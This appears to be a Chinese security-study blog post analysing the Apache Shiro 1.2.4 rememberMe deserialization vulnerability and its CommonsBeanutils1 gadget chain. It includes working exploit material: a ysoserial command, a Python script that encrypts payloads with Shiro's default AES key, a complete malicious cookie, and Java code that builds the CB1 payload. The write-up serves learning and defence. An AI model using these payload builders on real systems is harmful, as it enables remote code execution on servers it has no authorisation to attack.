---
title: Shiro反序列化
date: 2025-10-21 15:00:00
tags: [java 学习]            #标签
categories: [Java]      #分类
description: Shiro反序列化        #简要说明
toc: true           #显示目录
---
# Shiro反序列化

## Shiro反序列化

### 参考文章：

[Shiro反序列化漏洞笔记一（原理篇）](https://changxia3.com/2020/09/03/Shiro反序列化漏洞笔记一（原理篇）/)

### 环境搭建



直接从github上clone代码到本地。

```plain
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4
```

修改 pml.xml（路径为 \shiro\samples\web\pom.xml）

```xml
<dependency>
  <groupId>javax.servlet</groupId>
  <artifactId>jstl</artifactId>
  <version>1.2</version>    <!-- 添加 -->
  <scope>runtime</scope>
</dependency>
```

之后 maven 搭建，配置 tomcat 环境

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505867.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505841.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505868.png)

### 漏洞分析

漏洞分析具体已经在 Java-sec-code 分析过了，就不再重复了：

**逻辑总结：**

当获取用户请求时，大致的关键处理过程如下：

1. 获取Cookie中rememberMe的值

1. 对rememberMe进行Base64解码

1. 使用AES进行解密

1. 对解密的值进行反序列化



由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当

CookieRememberMeManager 对恶意的 rememberMe 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。

```java
@GetMapping(value = "/shiro/deserialize")
public String shiro_deserialize(HttpServletRequest req, HttpServletResponse res) {
    Cookie cookie = getCookie(req, Constants.REMEMBER_ME_COOKIE);
    if (null == cookie) {
        return "No rememberMe cookie. Right?";
    }

    try {
        String rememberMe = cookie.getValue();
        byte[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);
        byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();
        ByteArrayInputStream bytes = new ByteArrayInputStream(aesDecrypt);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();
    } catch (Exception e){
        if (CookieUtils.addCookie(res, "rememberMe", DELETE_ME)){
            log.error(e.getMessage());
            return "RememberMe cookie decrypt error. Set deleteMe cookie success.";
        }
    }

    return "Shiro deserialize";
}
```

Shiro  `rememberMe` 功能用于“记住登录状态”。它的设计逻辑是：

用户勾选“记住我”登录后，Shiro 把用户的认证信息**序列化为字节流**，用一个固定密钥（默认是 `kPH+bIxk5D2deZiIxcaaaA==`）用 AES 加密，Base64 编码后作为 `rememberMe` Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 `rememberMe` Cookie，用同样的密钥进行解密，然后**直接反序列化**出用户对象，只要攻击者能控制 `rememberMe` Cookie 内容，**就能构造恶意对象反序列化，从而执行任意代码。**

**漏洞利用：**

生成恶意序列化数据

```plain
java -jar ysoserial.jar CommonsBeanutils1 "calc.exe" > payload.bin
```

加密 Payload

```python
from Crypto.Cipher import AES
import base64

# Shiro 默认密钥
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# 读取 payload
with open("D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin", "rb") as f:
    payload = f.read()

# 补齐为 16 的倍数 (PKCS5Padding)
pad = 16 - len(payload) % 16
payload += bytes([pad] * pad)

# AES-CBC 加密 (IV 随机生成)
iv = b'\x00' * 16  # 实际攻击需随机 IV
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(payload)

# Base64 编码
rememberMe = base64.b64encode(iv + encrypted).decode()  # Shiro 格式: IV+密文
print("恶意 Cookie:", rememberMe)
```



```plain
恶意 Cookie: 
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
```

发送 cookie 请求

```plain
Cookie: 
rememberMe=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
```



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147642.png)





也可以利用工具：

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147425.png)



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101147524.png)



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101151464.png)

### 总结：

**重写readObject**

```java
//Serializable 接口表示这个类支持 Java 序列化
public class UserDemo implements Serializable {

    public String name="qaz";
    public String gender="man"; 

    //构造方法
    public UserDemo(String name,String gender){
        this.name=name;
        this.gender=gender;
        System.out.println(name);
        System.out.println(gender);
    }

    //重写 readObject ，当使用 ObjectInputStream.readObject() 反序列化时，JVM 会自动检查类里是否有 private void readObject(ObjectInputStream) 方法，如果有，就会在恢复对象后调用它
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        //表示按照默认方式反序列化对象的字段
        ois.defaultReadObject();
        //反序列化时直接执行系统命令
        Runtime.getRuntime().exec("calc");
    }

}
```

Shiro使用的是Java原生反序列化（当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用），其漏洞成因是反序列化的类**重写了readObject方法**，反序列化时调用readObject() 触发重写类的readObject() 方法

利用：恶意命令 -> 序列化 -> AES加密 ->  Base64编码 -> rememberMe Cookie 值 -> Base64解码 -> AES解密 -> 反序列化 -> 执行恶意命令

## Shiro 550反序列化

### 前置知识

#### 参考文章：

关于我学渗透的那档子事之Java反序列化-CB链

https://www.freebuf.com/articles/web/319397.html

Java代码审计&Shiro反序列化&CB1链

https://blog.csdn.net/qq_46081990/article/details/135724944

CC链 1-7 分析

https://xz.aliyun.com/news/8908

Javaweb安全——反序列化漏洞-CC&CB链思路整理

https://blog.csdn.net/weixin_43610673/article/details/127580121

#### 1、CC & CB 链 （简单理解）

**shiro反序列化利用工具**

JavaThings - Java安全漫谈笔记相关

https://github.com/phith0n/JavaThings/tree/master

**Commons Collections 链**

来源 Apache Commons Collections 库，利用该库的 `Transformer`、`LazyMap` 等类，在反序列化时自动调用恶意代码

**Commons Beanutils 链**

来源：Apache Commons Beanutils 库，利用 `BeanComparator` 在反序列化触发排序比较时，调用 getter 方法，从而间接触发另一条漏洞链（常常是 cc 链）

CB 链生成：

```java
public class Client1 {
    public static void main(String []args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        //获取 Evil 类，执行 Runtime.getRuntime().exec("calc.exe");
        CtClass clazz = pool.get(com.govuln.shiroattack.Evil.class.getName());
        //调用 CommonsBeanutils1Shiro#getPayload，传入序列化的恶意类，生成 CB1 链反序列化的 payload
        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        //将 key 值Base64 编码
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        //使用 AES 加密 payload，
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

#### 2、一个完整的攻击链通常由以下三个部分组成：

1、Source（源）：入口点，通常是指攻击链的起始点，其中用户输入或外部数据进入应用程序。在反序列化漏洞中，readObject 方法通常被认为是源，因为它是从输入流读取数据并进行反序列化的方法。

2、Sink（执行点）：执行点，是攻击链上的终点，其中攻击者希望执行恶意操作的位置。在反序列化漏洞中，sink 可能是一个动态方法执行、JNDI注入或写文件等操作。

3、Gadget（链）：连接入口执行的多个类，通过它们的相互方法调用形成攻击链。Gadget 类通常满足一些条件，例如类之间方法调用

是链式的，类实例之间的关系是嵌套的，调用链上的类都需要是可以序列化的。在反序列化漏洞中，Gadget 类是攻击者构建的、可序列

化的类，通过构建特定的对象图，使得在反序列化时执行恶意代码。

#### 3、理解数据结构

数据结构：

https://oi-wiki.org/ds/

二叉堆

https://oi-wiki.org/ds/binary-heap/

堆分为大根堆（父节点值不小于子节点值）和小根堆（父节点值不大于子节点值）

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110935553.png)

#### 4、CB中的JavaBean利用

PropertyUtils.getProperty(new Person(),"name");

自动调用Person对象里面的getName方法

PropertyUtils.getProperty(new TemplatesImpl(),"outputProperties")

自动调用TemplatesImpl对象里面的getOutputProperties方法



### Shiro 550 CB1 链分析

#### 利用链流程：

**入口点：**PriorityQueue#readObject方法（java/util/PriorityQueue.java），PriorityQueue类中重写了readObject方法，Shiro反序列化时会调用这个类调用重写的readObject方法

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110916682.png)



步入 heapify() 

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110920916.png)

```plain
// PriorityQueue 想象成一个二叉堆，本质是用一个数组 queue[] 存储的特殊二叉树
// heapify 的作用就是把一个“乱序”的数组，重新整理成符合堆规则的小根堆（即父节点值 <= 子节点值）
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

跟进 siftDown

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110921238.png)

```plain
// siftDown() 方法其实是 堆化(heapify) 的核心步骤之一，用于把某个元素往下移动，使其符合小根堆规则
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

跟进 siftDownUsingComparator ，堆化操作（heapify）的具体实现，用 `Comparator` 来比较元素大小。

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110922654.png)

跟进 comparator#compare，`Comparator<T>` 是一个**函数式接口**，用来定义“两个对象谁大谁小”。

它不要求对象本身实现 `Comparable`，可以把比较规则外置。

**返回值规则**：

- `< 0` → `o1` 比 `o2` 小

- `0` → 相等

- `> 0` → `o1` 比 `o2` 大

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508110958560.png)

那么接下来就要找到哪里调用了这个接口：

**关键点：BeanComparator.compare**

BeanComparator继承了Comparator类和Serializable类，并且出现了PropertyUtils.getProperty()

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111009650.png)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111012610.png)

那么，当执行 `Object value1 = PropertyUtils.getProperty(o1, this.property);`时，对其传参：

- `o1 = new TemplatesImpl()`

- `property = outputProperties`

- 就会自动调用 `TemplatesImpl#getOutputProperties` 方法

**关键点：getOutputProperties**

找到 getOutputProperties：

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111020514.png)

执行：`newTransformer().getOutputProperties();`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111022417.png)

跟进 newTransformer

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111023103.png)

跟进getTransletInstance

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111318767.png)

跟进 defineTransletClasses，当满足 `_bytecodes !== null`，向下执行 `loader.defineClass(_bytecodes[i])` ，将_bytecodes[i]中的字节码转换为Class对象，并将该类加载执行。

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111321868.png)



#### 总结调用链：

PriorityQueue#readObject（入口点 Source） -> heapify() -> siftDown() -> siftDownUsingComparator() -> comparator.compare() 

-> BeanComparator.compare()

-> PropertyUtils.getProperty() 

->  TemplatesImpl#getOutputProperties()（执行点 Sink） -> newTransformer() -> getTransletInstance() -> defineTransletClasses() 

-> loader.defineClass()

参照图片：

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101449749.jpeg)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508111343165.png)

#### 总结条件：

1. size值大于等于2；`size >>> 1`

1. `comparator != null`

1. `this.property != null`

1. `o1 = new TemplatesImpl()`&`this.property = outputProperties`

1. `_name != null`&`_class == null`

1. `_bytecodes != null`

#### POC编写分析 ：

```java
package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        //getClass 获取对象的类，getDeclaredField 通过反射获取这个类的声明字段（包括 private）
        Field field = obj.getClass().getDeclaredField(fieldName);
        //setAccessible(true) 关闭Java语言访问检查，允许程序访问和修改私有字段，允许我们突破私有权限限制，操作私有字段
        field.setAccessible(true);
        //把传入的 value 赋给 obj 对象的这个字段
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {

        // TemplatesImpl 类 常用于加载 XSLT 模板,核心是它 _bytecodes 字段，存放字节码
        TemplatesImpl obj = new TemplatesImpl();
        // 使用setFieldValue方法修改其相关成员变量的值
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        // TransformerFactoryImpl
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        //创建一个 BeanComparator，初始的 property 字段为 null
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        //创建一个 PriorityQueue，使用刚创建的 BeanComparator 作为元素比较器
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        //先往 PriorityQueue 添加两个占位元素 "1"
        queue.add("1");
        queue.add("1");

        //通过反射设置 comparator 的 property 字段为 "outputProperties",BeanComparator 会在比较时通过反射调用对象的 getOutputProperties() 方法
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        //通过 ObjectOutputStream 把构造好的 PriorityQueue 对象序列化成字节数组
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
```